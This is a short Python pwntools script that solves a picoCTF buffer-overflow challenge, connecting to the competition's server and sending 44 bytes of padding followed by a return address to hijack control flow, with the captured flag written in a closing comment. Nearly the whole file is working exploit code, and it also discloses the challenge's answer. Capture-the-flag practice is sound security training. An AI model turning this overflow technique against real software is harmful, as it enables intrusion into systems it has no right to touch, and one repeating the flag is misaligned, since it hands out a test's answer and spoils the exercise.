from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
# p = start()
r = remote("saturn.picoctf.net", 64686)

payload = flat(
    cyclic(44),
    0x80491f6
)

r.sendlineafter(b"Please enter your string: ", payload)
r.interactive()

# picoCTF{addr3ss3s_ar3_3asy_2e53b270}